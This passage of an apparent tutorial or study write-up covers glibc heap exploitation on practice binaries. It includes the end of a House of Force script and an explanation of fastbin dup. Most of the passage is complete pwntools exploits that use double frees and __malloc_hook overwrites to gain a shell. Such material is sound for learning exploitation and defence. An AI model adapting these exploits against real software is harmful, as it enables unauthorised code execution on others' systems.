</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvn</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts_leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>                <span class=c1>#important</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvn</span><span class=p>(</span><span class=mi>8</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;The address of puts:: &#34;</span><span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;The address of heap: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;The address of libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>distance</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=p>(</span><span class=n>heap_leak</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>24</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xffffffffffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>distance</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Option 1</span>
</span></span><span class=line><span class=cl><span class=c1>#cmd = heap_leak + 0x30  #the address save &#34;/bin/sh&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#malloc(io, cmd, b&#39;&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Option 2</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>cmd</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span> 
</span></span></code></pre></td></tr></table></div></div><h2 id=fastbin-dup>Fastbin dup</h2><h3 id=overall-1>Overall</h3><p><img src=https://hackmd.io/_uploads/HybqwqIHC.png loading=lazy alt=image></p><ul><li><p>The fastbin double-free check only ensures that a chunk being freed into a fastbin is not already the first chunk in that bin, if a different chunk of the same size is freed between the double-free then the check passes.</p></li><li><p>For example, request chunks A & B, both of which are the same size and qualify for the fastbins when freed, then free chunk A. If chunk A is freed again immediately, the fastbin double-free check will fail because chunk A is already the first chunk in that fastbin. Instead, free chunk B, then free chunk A again. This way chunk B is the first chunk in that fastbin when chunk A is freed for the second time. Now request three chunks of the same size as A & B, malloc will return chunk A, then chunk B, then chunk A again.</p></li><li><p>This may yield an opportunity to read from or write to a chunk that is allocated for another purpose. Alternatively, it could be used to tamper with fastbin metadata, specifically the forward pointer (fd) of the double-freed chunk. This may allow a fake chunk to be linked into the fastbin which can be allocated, then used to read from or write to an arbitrary location. Fake chunks allocated in this way must pass a size field check which ensures their size field value matches the chunk size of the fastbin they are being allocated from.</p></li><li><p>Watch out for incompatible flags in fake size fields, a set NON_MAIN_ARENA flag with a clear CHUNK_IS_MMAPPED flag can cause a segfault as malloc attempts to locate a non-existent arena.</p></li></ul><h3 id=approach-1>Approach</h3><p>Leverage a <em><strong>double-free bug</strong></em> to coerce malloc into <em><strong>returning the same chunk twice</strong></em>, without freeing it in between. This technique is typically capitalised upon by corrupting fastbin metadata to <em><strong>link a fake chunk into a fastbin</strong></em>. This fake chunk can be allocated, then program functionality could be used to <em><strong>read from or write to an arbitrary memory location.</strong></em></p><h3 id=further-use-1>Further use</h3><p><em><strong>The malloc hook</strong></em> is a good target for this technique, the 3 most-significant bytes of the _IO_wide_data_0 vtable pointer can be used in conjunction with part of the succeeding padding quadword to form a <strong>reliable 0x7f size field.</strong></p><ul><li><strong>This works because allocations are subject neither to alignment checks nor to flag corruption checks.</strong></li></ul><h3 id=limitations-1>Limitations</h3><p><em><strong>The fastbin size field check</strong></em> during allocation limits candidates for fake chunks.</p><h3 id=fastbin-dup-1>Fastbin dup 1</h3><p>overwrite.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./fastbin_dup&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span><span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>}</span> <span class=p>,</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_name</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your username: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send_name</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts in libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dup</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;c&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;d&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;You win&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>shell.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./fastbin_dup&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+319
</span></span></span><span class=line><span class=cl><span class=s2>b *main+492
</span></span></span><span class=line><span class=cl><span class=s2>b *main+598
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_name</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your username: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=nb>id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=nb>id</span><span class=si>}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts in libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_leak</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts_leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>send_name</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Broder&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dup</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mi>35</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;c&#39;</span><span class=o>*</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;d&#39;</span><span class=o>*</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>19</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0xe1fa1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=fastbin-dup-2>Fastbin dup 2</h3><p><em><strong>This binary challenge doesn&rsquo;t allow request 0x68 size</strong></em></p><p>shell.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
